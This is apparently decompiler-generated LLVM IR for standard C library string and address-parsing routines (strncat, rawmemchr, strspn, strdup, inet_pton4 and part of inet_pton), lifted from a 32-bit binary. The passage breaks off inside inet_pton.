define i32 @__GI_strncat() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i8* @__decompiler_undefined_function_2()
  %stack_var_-8 = alloca i32, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_805627b = load i32, i32* @esi, align 4
  store i32 %v0_805627b, i32* %stack_var_-8, align 4
  store i32 -1, i32* %ecx.global-to-local, align 4
  %v4_805627f = ptrtoint i8* %tmp5 to i32
  store i32 %v4_805627f, i32* %esi.global-to-local, align 4
  %v4_8056287 = inttoptr i32 %tmp to i8*
  store i32 %tmp, i32* %edi.global-to-local, align 4
  %v3_805628b = call i32 @_strlen(i8* %v4_8056287)
  %v2_805628d = add i32 %tmp, -1
  store i32 %v2_805628d, i32* %edi.global-to-local, align 4
  %v8_805629113 = icmp eq i32 %tmp4, 0
  store i32 %tmp4, i32* %ecx.global-to-local, align 4
  br i1 %v8_805629113, label %dec_label_pc_805629c, label %dec_label_pc_8056294.lr.ph

dec_label_pc_8056294.lr.ph:                       ; preds = %entry
  %v4_8056294.pre = load i32, i32* %eax.global-to-local, align 4
  %v8_8056294.pre = load i1, i1* @df, align 1
  br label %dec_label_pc_8056294

dec_label_pc_8056294:                             ; preds = %dec_label_pc_8056294.lr.ph, %dec_label_pc_8056294.dec_label_pc_8056291_crit_edge
  %v8_8056294 = phi i1 [ %v8_8056294.pre, %dec_label_pc_8056294.lr.ph ], [ %v5_8056295, %dec_label_pc_8056294.dec_label_pc_8056291_crit_edge ]
  %v4_8056294 = phi i32 [ %v4_8056294.pre, %dec_label_pc_8056294.lr.ph ], [ %v0_8056296, %dec_label_pc_8056294.dec_label_pc_8056291_crit_edge ]
  %v2_805629e15 = phi i32 [ %v2_805628d, %dec_label_pc_8056294.lr.ph ], [ %v7_8056295, %dec_label_pc_8056294.dec_label_pc_8056291_crit_edge ]
  %v0_8056294 = load i32, i32* %esi.global-to-local, align 4
  %v1_8056294 = inttoptr i32 %v0_8056294 to i8*
  %v2_8056294 = load i8, i8* %v1_8056294, align 1
  %v3_8056294 = zext i8 %v2_8056294 to i32
  %v5_8056294 = and i32 %v4_8056294, -256
  %v6_8056294 = or i32 %v5_8056294, %v3_8056294
  store i32 %v6_8056294, i32* %eax.global-to-local, align 4
  %v9_8056294 = select i1 %v8_8056294, i32 -1, i32 1
  %v10_8056294 = add i32 %v9_8056294, %v0_8056294
  store i32 %v10_8056294, i32* %esi.global-to-local, align 4
  %v3_8056295 = inttoptr i32 %v2_805629e15 to i8*
  store i8 %v2_8056294, i8* %v3_8056295, align 1
  %v4_8056295 = load i32, i32* %edi.global-to-local, align 4
  %v5_8056295 = load i1, i1* @df, align 1
  %v6_8056295 = select i1 %v5_8056295, i32 -1, i32 1
  %v7_8056295 = add i32 %v6_8056295, %v4_8056295
  store i32 %v7_8056295, i32* %edi.global-to-local, align 4
  %v0_8056296 = load i32, i32* %eax.global-to-local, align 4
  %v3_8056296 = trunc i32 %v0_8056296 to i8
  %v4_8056296 = icmp eq i8 %v3_8056296, 0
  %v1_8056298 = icmp eq i1 %v4_8056296, false
  br i1 %v1_8056298, label %dec_label_pc_8056294.dec_label_pc_8056291_crit_edge, label %dec_label_pc_805629f

dec_label_pc_8056294.dec_label_pc_8056291_crit_edge: ; preds = %dec_label_pc_8056294
  %v0_8056291.pre = load i32, i32* %ecx.global-to-local, align 4
  %v1_8056291 = add i32 %v0_8056291.pre, -1
  %v8_8056291 = icmp eq i32 %v1_8056291, 0
  store i32 %v1_8056291, i32* %ecx.global-to-local, align 4
  br i1 %v8_8056291, label %dec_label_pc_805629c, label %dec_label_pc_8056294

dec_label_pc_805629c:                             ; preds = %dec_label_pc_8056294.dec_label_pc_8056291_crit_edge, %entry
  %v2_805629e.lcssa = phi i32 [ %v2_805628d, %entry ], [ %v7_8056295, %dec_label_pc_8056294.dec_label_pc_8056291_crit_edge ]
  store i32 0, i32* %eax.global-to-local, align 4
  %v3_805629e = inttoptr i32 %v2_805629e.lcssa to i8*
  store i8 0, i8* %v3_805629e, align 1
  %v4_805629e = load i32, i32* %edi.global-to-local, align 4
  %v5_805629e = load i1, i1* @df, align 1
  %v6_805629e = select i1 %v5_805629e, i32 -1, i32 1
  %v7_805629e = add i32 %v6_805629e, %v4_805629e
  store i32 %v7_805629e, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_805629f

dec_label_pc_805629f:                             ; preds = %dec_label_pc_8056294, %dec_label_pc_805629c
  store i32 %tmp, i32* %eax.global-to-local, align 4
  %v2_80562a3 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80562a3, i32* @esi, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v1_8056291, { 1, 0 }
  uselistorder i32 %v0_8056296, { 1, 0 }
  uselistorder i32 %v7_8056295, { 0, 2, 1 }
  uselistorder i1 %v5_8056295, { 1, 0 }
  uselistorder i32 %tmp4, { 1, 0 }
  uselistorder i32 %tmp, { 4, 3, 0, 1, 2 }
  uselistorder i32* %edi.global-to-local, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32* %ecx.global-to-local, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_805629f, { 1, 0 }
  uselistorder label %dec_label_pc_8056294, { 1, 0 }
}

define i32 @rawmemchr(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_80562a9 = load i32, i32* @ebx, align 4
  %v4_80562aa = urem i32 %arg2, 256
  %v4_80562ae = ptrtoint i8* %arg1 to i32
  %v2_80562b94 = urem i32 %v4_80562ae, 4
  %v3_80562b95 = icmp eq i32 %v2_80562b94, 0
  %v1_80562bb9 = icmp eq i1 %v3_80562b95, false
  %v4_80562b4 = trunc i32 %arg2 to i8
  br i1 %v1_80562bb9, label %dec_label_pc_80562b4, label %dec_label_pc_80562bd

dec_label_pc_80562b4:                             ; preds = %entry, %dec_label_pc_80562b8
  %v0_80562b8 = phi i32 [ %v1_80562b8, %dec_label_pc_80562b8 ], [ %v4_80562ae, %entry ]
  %v1_80562b4 = inttoptr i32 %v0_80562b8 to i8*
  %v2_80562b4 = load i8, i8* %v1_80562b4, align 1
  %v15_80562b4 = icmp eq i8 %v2_80562b4, %v4_80562b4
  br i1 %v15_80562b4, label %dec_label_pc_8056308, label %dec_label_pc_80562b8

dec_label_pc_80562b8:                             ; preds = %dec_label_pc_80562b4
  %v1_80562b8 = add i32 %v0_80562b8, 1
  %v2_80562b9 = urem i32 %v1_80562b8, 4
  %v3_80562b9 = icmp eq i32 %v2_80562b9, 0
  %v1_80562bb = icmp eq i1 %v3_80562b9, false
  br i1 %v1_80562bb, label %dec_label_pc_80562b4, label %dec_label_pc_80562bd

dec_label_pc_80562bd:                             ; preds = %entry, %dec_label_pc_80562b8
  %v0_80562c0 = phi i32 [ %v1_80562b8, %dec_label_pc_80562b8 ], [ %v4_80562ae, %entry ]
  %v2_80562c4 = mul nuw nsw i32 %v4_80562aa, 256
  %v2_80562c7 = or i32 %v2_80562c4, %v4_80562aa
  %v2_80562cb = mul i32 %v2_80562c7, 65536
  %v2_80562ce = or i32 %v2_80562cb, %v2_80562c7
  br label %dec_label_pc_80562d0

dec_label_pc_80562d0:                             ; preds = %dec_label_pc_8056300, %dec_label_pc_80562d0, %dec_label_pc_80562bd
  %v0_80562d4 = phi i32 [ %v0_80562c0, %dec_label_pc_80562bd ], [ %v1_80562d4, %dec_label_pc_80562d0 ], [ %v1_80562d4, %dec_label_pc_8056300 ]
  %v2_80562d2 = inttoptr i32 %v0_80562d4 to i32*
  %v3_80562d2 = load i32, i32* %v2_80562d2, align 4
  %v4_80562d2 = xor i32 %v3_80562d2, %v2_80562ce
  %v1_80562d4 = add i32 %v0_80562d4, 4
  store i32 %v1_80562d4, i32* @ecx, align 4
  %v1_80562d7 = add i32 %v4_80562d2, 2130640639
  %v1_80562dd = sub i32 -1, %v4_80562d2
  store i32 %v1_80562dd, i32* @edx, align 4
  %v2_80562df = xor i32 %v1_80562d7, %v1_80562dd
  %v1_80562e1 = and i32 %v2_80562df, -2130640640
  %v2_80562e1 = icmp eq i32 %v1_80562e1, 0
  br i1 %v2_80562e1, label %dec_label_pc_80562d0, label %dec_label_pc_80562e8

dec_label_pc_80562e8:                             ; preds = %dec_label_pc_80562d0
  %v2_80562e8 = inttoptr i32 %v0_80562d4 to i8*
  %v3_80562e8 = load i8, i8* %v2_80562e8, align 1
  %v16_80562e8 = icmp eq i8 %v3_80562e8, %v4_80562b4
  br i1 %v16_80562e8, label %dec_label_pc_8056308, label %dec_label_pc_80562f0

dec_label_pc_80562f0:                             ; preds = %dec_label_pc_80562e8
  %v1_80562f0 = add i32 %v0_80562d4, 1
  %v2_80562f0 = inttoptr i32 %v1_80562f0 to i8*
  %v3_80562f0 = load i8, i8* %v2_80562f0, align 1
  %v16_80562f0 = icmp eq i8 %v3_80562f0, %v4_80562b4
  br i1 %v16_80562f0, label %dec_label_pc_8056308, label %dec_label_pc_80562f8

dec_label_pc_80562f8:                             ; preds = %dec_label_pc_80562f0
  %v1_80562f8 = add i32 %v0_80562d4, 2
  %v2_80562f8 = inttoptr i32 %v1_80562f8 to i8*
  %v3_80562f8 = load i8, i8* %v2_80562f8, align 1
  %v16_80562f8 = icmp eq i8 %v3_80562f8, %v4_80562b4
  br i1 %v16_80562f8, label %dec_label_pc_8056308, label %dec_label_pc_8056300

dec_label_pc_8056300:                             ; preds = %dec_label_pc_80562f8
  %v1_8056300 = add i32 %v0_80562d4, 3
  %v2_8056300 = inttoptr i32 %v1_8056300 to i8*
  %v3_8056300 = load i8, i8* %v2_8056300, align 1
  %v16_8056300 = icmp eq i8 %v3_8056300, %v4_80562b4
  %v1_8056306 = icmp eq i1 %v16_8056300, false
  br i1 %v1_8056306, label %dec_label_pc_80562d0, label %dec_label_pc_8056308

dec_label_pc_8056308:                             ; preds = %dec_label_pc_80562b4, %dec_label_pc_8056300, %dec_label_pc_80562f8, %dec_label_pc_80562f0, %dec_label_pc_80562e8
  %v0_805630a = phi i32 [ %v1_8056300, %dec_label_pc_8056300 ], [ %v1_80562f8, %dec_label_pc_80562f8 ], [ %v1_80562f0, %dec_label_pc_80562f0 ], [ %v0_80562d4, %dec_label_pc_80562e8 ], [ %v0_80562b8, %dec_label_pc_80562b4 ]
  store i32 %v0_80562a9, i32* @ebx, align 4
  ret i32 %v0_805630a

; uselistorder directives
  uselistorder i32 %v1_80562dd, { 1, 0 }
  uselistorder i32 %v1_80562d4, { 2, 1, 0 }
  uselistorder i32 %v2_80562c7, { 1, 0 }
  uselistorder i32 %v1_80562b8, { 1, 0, 2 }
  uselistorder i8 %v4_80562b4, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v4_80562ae, { 2, 1, 0 }
  uselistorder i32 %v4_80562aa, { 1, 0 }
  uselistorder i32 -2130640640, { 1, 0 }
  uselistorder i32 2130640639, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_8056308, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_80562bd, { 1, 0 }
  uselistorder label %dec_label_pc_80562b4, { 1, 0 }
}

define i32 @__GI_strspn(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v2_805632e31 = load i8, i8* %arg1, align 1
  %v4_805633035 = icmp eq i8 %v2_805632e31, 0
  br i1 %v4_805633035, label %dec_label_pc_8056338, label %dec_label_pc_8056334.lr.ph

dec_label_pc_8056334.lr.ph:                       ; preds = %entry
  %v3_805632e32 = zext i8 %v2_805632e31 to i32
  %v4_805632e.pre = load i32, i32* @eax, align 4
  %v5_805632e33 = and i32 %v4_805632e.pre, -256
  %v6_805632e34 = or i32 %v3_805632e32, %v5_805632e33
  %v4_8056315 = ptrtoint i8* %arg1 to i32
  %v1_805632018 = inttoptr i32 %arg2 to i8*
  %v4_8056320.pre.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8056334

dec_label_pc_805631b:                             ; preds = %dec_label_pc_8056334, %dec_label_pc_805631f
  %v6_805632028 = phi i32 [ %v6_8056320, %dec_label_pc_805631f ], [ %v6_805632022, %dec_label_pc_8056334 ]
  %v2_805632027 = phi i8 [ %v2_8056320, %dec_label_pc_805631f ], [ %v2_805632019, %dec_label_pc_8056334 ]
  %v0_805631f26 = phi i32 [ %v1_805631f, %dec_label_pc_805631f ], [ %arg2, %dec_label_pc_8056334 ]
  %v15_805631b = icmp eq i8 %v2_805632e39, %v2_805632027
  br i1 %v15_805631b, label %dec_label_pc_8056328, label %dec_label_pc_805631f

dec_label_pc_805631f:                             ; preds = %dec_label_pc_805631b
  %v1_805631f = add i32 %v0_805631f26, 1
  store i32 %v1_805631f, i32* @edx, align 4
  %v1_8056320 = inttoptr i32 %v1_805631f to i8*
  %v2_8056320 = load i8, i8* %v1_8056320, align 1
  %v3_8056320 = zext i8 %v2_8056320 to i32
  %v5_8056320 = and i32 %v6_805632028, -256
  %v6_8056320 = or i32 %v3_8056320, %v5_8056320
  store i32 %v6_8056320, i32* @ecx, align 4
  %v4_8056322 = icmp eq i8 %v2_8056320, 0
  %v1_8056324 = icmp eq i1 %v4_8056322, false
  br i1 %v1_8056324, label %dec_label_pc_805631b, label %dec_label_pc_8056338

dec_label_pc_8056328:                             ; preds = %dec_label_pc_805631b
  %v1_805632c = add i32 %v0_805633937, 1
  %v1_805632d = add i32 %v0_805632d38, 1
  %v1_805632e = inttoptr i32 %v1_805632d to i8*
  %v2_805632e = load i8, i8* %v1_805632e, align 1
  %v3_805632e = zext i8 %v2_805632e to i32
  %v5_805632e = and i32 %v6_805632e40, -256
  %v6_805632e = or i32 %v3_805632e, %v5_805632e
  %v4_8056330 = icmp eq i8 %v2_805632e, 0
  br i1 %v4_8056330, label %dec_label_pc_8056338, label %dec_label_pc_8056334

dec_label_pc_8056334:                             ; preds = %dec_label_pc_8056334.lr.ph, %dec_label_pc_8056328
  %v4_8056320.pre = phi i32 [ %v4_8056320.pre.pre, %dec_label_pc_8056334.lr.ph ], [ %v6_805632028, %dec_label_pc_8056328 ]
  %v6_805632e40 = phi i32 [ %v6_805632e34, %dec_label_pc_8056334.lr.ph ], [ %v6_805632e, %dec_label_pc_8056328 ]
  %v2_805632e39 = phi i8 [ %v2_805632e31, %dec_label_pc_8056334.lr.ph ], [ %v2_805632e, %dec_label_pc_8056328 ]
  %v0_805632d38 = phi i32 [ %v4_8056315, %dec_label_pc_8056334.lr.ph ], [ %v1_805632d, %dec_label_pc_8056328 ]
  %v0_805633937 = phi i32 [ 0, %dec_label_pc_8056334.lr.ph ], [ %v1_805632c, %dec_label_pc_8056328 ]
  store i32 %arg2, i32* @edx, align 4
  %v2_805632019 = load i8, i8* %v1_805632018, align 1
  %v3_805632020 = zext i8 %v2_805632019 to i32
  %v5_805632021 = and i32 %v4_8056320.pre, -256
  %v6_805632022 = or i32 %v3_805632020, %v5_805632021
  store i32 %v6_805632022, i32* @ecx, align 4
  %v4_805632223 = icmp eq i8 %v2_805632019, 0
  %v1_805632425 = icmp eq i1 %v4_805632223, false
  br i1 %v1_805632425, label %dec_label_pc_805631b, label %dec_label_pc_8056338

dec_label_pc_8056338:                             ; preds = %entry, %dec_label_pc_8056328, %dec_label_pc_8056334, %dec_label_pc_805631f
  %v0_805633917 = phi i32 [ %v0_805633937, %dec_label_pc_805631f ], [ %v0_805633937, %dec_label_pc_8056334 ], [ 0, %entry ], [ %v1_805632c, %dec_label_pc_8056328 ]
  ret i32 %v0_805633917

; uselistorder directives
  uselistorder i32 %v6_805632022, { 1, 0 }
  uselistorder i8 %v2_805632019, { 1, 2, 0 }
  uselistorder i32 %v1_805632d, { 1, 0 }
  uselistorder i32 %v6_8056320, { 1, 0 }
  uselistorder i8 %v2_8056320, { 1, 2, 0 }
  uselistorder i32 %v1_805631f, { 2, 1, 0 }
  uselistorder i8 %v2_805632e31, { 0, 2, 1 }
  uselistorder i32 %arg2, { 2, 0, 1 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8056338, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_8056334, { 1, 0 }
}

define i32 @__GI_strdup(i8* %arg1) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8056340 = load i32, i32* @edi, align 4
  %v0_8056341 = load i32, i32* @esi, align 4
  %v0_8056342 = load i32, i32* @ebx, align 4
  store i32 %v0_8056342, i32* %stack_var_-12, align 4
  %v4_8056343 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8056343, i32* @edi, align 4
  %v3_805634b = call i32 @strlen(i8* %arg1)
  %v1_8056350 = add i32 %v3_805634b, 1
  store i32 %v1_8056350, i32* @esi, align 4
  %v2_8056356 = call i32 @malloc(i32 %v1_8056350)
  %v1_805635e = icmp eq i32 %v2_8056356, 0
  store i32 %v2_8056356, i32* %ebx.global-to-local, align 4
  br i1 %v1_805635e, label %dec_label_pc_8056370, label %dec_label_pc_8056364

dec_label_pc_8056364:                             ; preds = %entry
  %v0_8056365 = load i32, i32* @esi, align 4
  %v0_8056366 = load i32, i32* @edi, align 4
  %tmp12 = inttoptr i32 %v2_8056356 to i16*
  %v6_8056368 = call i32 @memcpy(i16* %tmp12, i32 %v0_8056366, i32 %v0_8056365)
  %v0_8056370.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8056370

dec_label_pc_8056370:                             ; preds = %entry, %dec_label_pc_8056364
  %v0_8056370 = phi i32 [ 0, %entry ], [ %v0_8056370.pre, %dec_label_pc_8056364 ]
  %v2_8056372 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8056372, i32* @ebx, align 4
  store i32 %v0_8056341, i32* @esi, align 4
  store i32 %v0_8056340, i32* @edi, align 4
  ret i32 %v0_8056370

; uselistorder directives
  uselistorder i32 %v2_8056356, { 0, 2, 1 }
  uselistorder i32 (i32)* @malloc, { 12, 9, 8, 6, 5, 4, 1, 11, 10, 17, 16, 15, 14, 13, 7, 3, 2, 0 }
  uselistorder label %dec_label_pc_8056370, { 1, 0 }
}

define i32 @inet_pton4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  store i32 0, i32* @edx, align 4
  %v0_805637e = load i32, i32* @esi, align 4
  store i32 0, i32* @edi, align 4
  %v0_8056381 = load i32, i32* @ebx, align 4
  store i32 %v0_8056381, i32* %stack_var_-16, align 4
  %v0_8056382 = load i32, i32* @eax, align 4
  store i32 %v0_8056382, i32* %ebx.global-to-local, align 4
  store i1 false, i1* %zf.global-to-local, align 1
  %v15_8056384 = ptrtoint i32* %stack_var_-44 to i32
  %v2_8056387 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_8056387, i32* @esi, align 4
  store i32 0, i32* %stack_var_-20, align 4
  %v1_80563cf15 = inttoptr i32 %v0_8056382 to i8*
  %v2_80563cf16 = load i8, i8* %v1_80563cf15, align 1
  %v3_80563cf17 = sext i8 %v2_80563cf16 to i32
  store i32 %v3_80563cf17, i32* @ecx, align 4
  %v1_80563d218 = add i32 %v0_8056382, 1
  store i32 %v1_80563d218, i32* %ebx.global-to-local, align 4
  %v1_80563d319 = icmp eq i8 %v2_80563cf16, 0
  store i1 %v1_80563d319, i1* %zf.global-to-local, align 1
  %v1_80563d521 = icmp eq i1 %v1_80563d319, false
  br i1 %v1_80563d521, label %dec_label_pc_8056392, label %dec_label_pc_80563d7

dec_label_pc_8056392:                             ; preds = %entry, %dec_label_pc_80563cf.backedge
  %v3_80563cf23 = phi i32 [ %v3_80563cf, %dec_label_pc_80563cf.backedge ], [ %v3_80563cf17, %entry ]
  %v2_80563cf22 = phi i8 [ %v2_80563cf, %dec_label_pc_80563cf.backedge ], [ %v2_80563cf16, %entry ]
  %v1_8056392 = add nsw i32 %v3_80563cf23, -48
  store i32 %v1_8056392, i32* @eax, align 4
  %v9_8056395 = icmp eq i8 %v2_80563cf22, 57
  store i1 %v9_8056395, i1* %zf.global-to-local, align 1
  %v6_8056398 = icmp ugt i32 %v1_8056392, 9
  br i1 %v6_8056398, label %dec_label_pc_80563bb, label %dec_label_pc_805639a

dec_label_pc_805639a:                             ; preds = %dec_label_pc_8056392
  %v0_805639a = load i32, i32* @esi, align 4
  %v1_805639a = inttoptr i32 %v0_805639a to i8*
  %v2_805639a = load i8, i8* %v1_805639a, align 1
  %v2_805639d = zext i8 %v2_805639a to i32
  %v3_805639d = mul nuw nsw i32 %v2_805639d, 10
  %v3_80563a0 = add nsw i32 %v3_805639d, %v1_8056392
  store i32 %v3_80563a0, i32* @eax, align 4
  %v9_80563a4 = icmp eq i32 %v3_80563a0, 255
  store i1 %v9_80563a4, i1* %zf.global-to-local, align 1
  %v6_80563a9 = icmp ugt i32 %v3_80563a0, 255
  br i1 %v6_80563a9, label %dec_label_pc_80563f4, label %dec_label_pc_80563ab

dec_label_pc_80563ab:                             ; preds = %dec_label_pc_805639a
  %v0_80563ab = load i32, i32* @edx, align 4
  %v1_80563ab = icmp eq i32 %v0_80563ab, 0
  store i1 %v1_80563ab, i1* %zf.global-to-local, align 1
  %v1_80563ad = trunc i32 %v3_80563a0 to i8
  store i8 %v1_80563ad, i8* %v1_805639a, align 1
  %v0_80563af = load i1, i1* %zf.global-to-local, align 1
  %v1_80563af = icmp eq i1 %v0_80563af, false
  br i1 %v1_80563af, label %dec_label_pc_80563cf.backedge, label %dec_label_pc_80563b1

dec_label_pc_80563b1:                             ; preds = %dec_label_pc_80563ab
  %v0_80563b1 = load i32, i32* @edi, align 4
  %v1_80563b1 = add i32 %v0_80563b1, 1
  store i32 %v1_80563b1, i32* @edi, align 4
  %v1_80563b2 = add i32 %v0_80563b1, -3
  %v6_80563b2 = sub i32 2, %v0_80563b1
  %v7_80563b2 = and i32 %v6_80563b2, %v1_80563b1
  %v8_80563b2 = icmp slt i32 %v7_80563b2, 0
  %v9_80563b2 = icmp eq i32 %v1_80563b2, 0
  store i1 %v9_80563b2, i1* %zf.global-to-local, align 1
  %v10_80563b2 = icmp slt i32 %v1_80563b2, 0
  %v3_80563b5 = icmp eq i1 %v10_80563b2, %v8_80563b2
  %v4_80563b5 = icmp eq i1 %v9_80563b2, false
  %v5_80563b5 = and i1 %v4_80563b5, %v3_80563b5
  br i1 %v5_80563b5, label %dec_label_pc_80563f4, label %dec_label_pc_80563b7

dec_label_pc_80563b7:                             ; preds = %dec_label_pc_80563b1
  %v0_80563b7 = load i32, i32* @edx, align 4
  %v1_80563b7 = and i32 %v0_80563b7, -256
  %v2_80563b7 = or i32 %v1_80563b7, 1
  store i32 %v2_80563b7, i32* @edx, align 4
  br label %dec_label_pc_80563cf.backedge

dec_label_pc_80563bb:                             ; preds = %dec_label_pc_8056392
  %v9_80563bb = icmp eq i8 %v2_80563cf22, 46
  store i1 %v9_80563bb, i1* %zf.global-to-local, align 1
  %v1_80563be = icmp eq i1 %v9_80563bb, false
  br i1 %v1_80563be, label %dec_label_pc_80563f4, label %dec_label_pc_80563c0

dec_label_pc_80563c0:                             ; preds = %dec_label_pc_80563bb
  %v0_80563c0 = load i32, i32* @edx, align 4
  %v1_80563c0 = icmp eq i32 %v0_80563c0, 0
  store i1 %v1_80563c0, i1* %zf.global-to-local, align 1
  br i1 %v1_80563c0, label %dec_label_pc_80563f4, label %dec_label_pc_80563c4

dec_label_pc_80563c4:                             ; preds = %dec_label_pc_80563c0
  %v0_80563c4 = load i32, i32* @edi, align 4
  %v9_80563c4 = icmp eq i32 %v0_80563c4, 4
  store i1 %v9_80563c4, i1* %zf.global-to-local, align 1
  br i1 %v9_80563c4, label %dec_label_pc_80563f4, label %dec_label_pc_80563c9

dec_label_pc_80563c9:                             ; preds = %dec_label_pc_80563c4
  %v0_80563c9 = load i32, i32* @esi, align 4
  %v1_80563c9 = add i32 %v0_80563c9, 1
  store i32 %v1_80563c9, i32* @esi, align 4
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* @edx, align 4
  %v1_80563cc = inttoptr i32 %v1_80563c9 to i8*
  store i8 0, i8* %v1_80563cc, align 1
  br label %dec_label_pc_80563cf.backedge

dec_label_pc_80563cf.backedge:                    ; preds = %dec_label_pc_80563c9, %dec_label_pc_80563b7, %dec_label_pc_80563ab
  %v0_80563cf.pre = load i32, i32* %ebx.global-to-local, align 4
  %v1_80563cf = inttoptr i32 %v0_80563cf.pre to i8*
  %v2_80563cf = load i8, i8* %v1_80563cf, align 1
  %v3_80563cf = sext i8 %v2_80563cf to i32
  store i32 %v3_80563cf, i32* @ecx, align 4
  %v1_80563d2 = add i32 %v0_80563cf.pre, 1
  store i32 %v1_80563d2, i32* %ebx.global-to-local, align 4
  %v1_80563d3 = icmp eq i8 %v2_80563cf, 0
  store i1 %v1_80563d3, i1* %zf.global-to-local, align 1
  %v1_80563d5 = icmp eq i1 %v1_80563d3, false
  br i1 %v1_80563d5, label %dec_label_pc_8056392, label %dec_label_pc_80563cf.dec_label_pc_80563d7_crit_edge

dec_label_pc_80563cf.dec_label_pc_80563d7_crit_edge: ; preds = %dec_label_pc_80563cf.backedge
  %v0_80563d7.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_80563d7

dec_label_pc_80563d7:                             ; preds = %dec_label_pc_80563cf.dec_label_pc_80563d7_crit_edge, %entry
  %v0_80563d7 = phi i32 [ %v0_80563d7.pre, %dec_label_pc_80563cf.dec_label_pc_80563d7_crit_edge ], [ 0, %entry ]
  %v10_80563d7 = icmp eq i32 %v0_80563d7, 3
  store i1 %v10_80563d7, i1* %zf.global-to-local, align 1
  %v7_80563da = icmp sgt i32 %v0_80563d7, 3
  br i1 %v7_80563da, label %dec_label_pc_80563dc, label %dec_label_pc_80563f4

dec_label_pc_80563dc:                             ; preds = %dec_label_pc_80563d7
  %v0_80563dc = load i32, i32* @eax, align 4
  %v3_80563e5 = bitcast i32* %stack_var_-20 to i16*
  %v4_80563e5 = call i32 @memcpy(i16* %v3_80563e5, i32 4, i32 %v0_80563dc)
  %v0_80563ef = load i32, i32* @esp, align 4
  %v6_80563ef = icmp eq i32 %v0_80563ef, -16
  store i1 %v6_80563ef, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_80563f6

dec_label_pc_80563f4:                             ; preds = %dec_label_pc_80563c4, %dec_label_pc_80563c0, %dec_label_pc_80563bb, %dec_label_pc_80563b1, %dec_label_pc_805639a, %dec_label_pc_80563d7
  store i1 true, i1* %zf.global-to-local, align 1
  %v0_80563f6.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80563f6

dec_label_pc_80563f6:                             ; preds = %dec_label_pc_80563dc, %dec_label_pc_80563f4
  %v0_80563f6 = phi i32 [ %v15_8056384, %dec_label_pc_80563dc ], [ %v0_80563f6.pre, %dec_label_pc_80563f4 ]
  %v0_80563fd = phi i32 [ 1, %dec_label_pc_80563dc ], [ 0, %dec_label_pc_80563f4 ]
  %v9_80563f6 = icmp eq i32 %v0_80563f6, -28
  store i1 %v9_80563f6, i1* %zf.global-to-local, align 1
  %v2_80563f9 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_80563f9, i32* @ebx, align 4
  store i32 %v0_805637e, i32* @esi, align 4
  ret i32 %v0_80563fd

; uselistorder directives
  uselistorder i32 %v0_80563d7, { 1, 0 }
  uselistorder i32 %v3_80563cf, { 1, 0 }
  uselistorder i8 %v2_80563cf, { 1, 2, 0 }
  uselistorder i1 %v9_80563c4, { 1, 0 }
  uselistorder i32 %v1_80563b2, { 1, 0 }
  uselistorder i32 %v3_80563a0, { 1, 2, 0, 3 }
  uselistorder i8 %v2_80563cf22, { 1, 0 }
  uselistorder i1* %zf.global-to-local, { 0, 1, 2, 3, 13, 4, 5, 6, 7, 8, 9, 10, 11, 12, 15, 14 }
  uselistorder i32* %ebx.global-to-local, { 0, 2, 3, 1 }
  uselistorder i32 255, { 4, 2, 1, 0, 3, 5, 6, 7 }
  uselistorder label %dec_label_pc_80563f6, { 1, 0 }
  uselistorder label %dec_label_pc_80563f4, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_8056392, { 1, 0 }
}

define i32 @inet_pton(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_80563fe = load i32, i32* @ebp, align 4
  %v0_80563ff = load i32, i32* @edi, align 4
  %v0_8056400 = load i32, i32* @esi, align 4
  %v0_8056401 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v4_8056409 = ptrtoint i8* %arg2 to i32
  store i32 %v4_8056409, i32* @edi, align 4
  %v9_805640d = icmp eq i32 %arg1, 2
  br i1 %v9_805640d, label %dec_label_pc_805641d, label %dec_label_pc_8056412

dec_label_pc_8056412:                             ; preds = %entry
  %v9_8056412 = icmp eq i32 %arg1, 10
  %v1_8056415 = icmp eq i1 %v9_8056412, false
  br i1 %v1_8056415, label %dec_label_pc_80565ae, label %dec_label_pc_805642d

dec_label_pc_805641d:                             ; preds = %entry
  store i32 %arg3, i32* @edx, align 4
  store i32 %v4_8056409, i32* @eax, align 4
